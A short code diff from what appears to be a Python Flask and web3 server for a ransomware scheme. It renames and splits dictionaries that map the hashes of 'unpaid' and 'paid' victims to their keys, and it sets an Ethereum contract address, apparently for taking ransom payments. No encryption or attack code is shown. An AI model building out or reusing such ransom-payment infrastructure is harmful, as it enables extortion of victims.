@@ -3,14 +3,16 @@ import json
 import web3
 
 from web3 import Web3, TestRPCProvider, Account
-from solc import compile_source
 from web3.contract import ConciseContract
 from web3.auto import w3
 import threading
 app = Flask(__name__)
 
-# Maps the hashes of the ransomer's victims to their keys
+# Maps the hashes of the ransomer's unpaid victims to their keys
 ransom_ledger = {}
+
+# Maps the hashes of ransomer's paid victims to their keys
+unlocked = {}
 
 # contract_address = '0x3119f49c6B71d0fDa4f2515562662f41356e04Dc'
 contract_address = '0x6332F4caB3770C373dd6FA9b0363775003b8f85B'
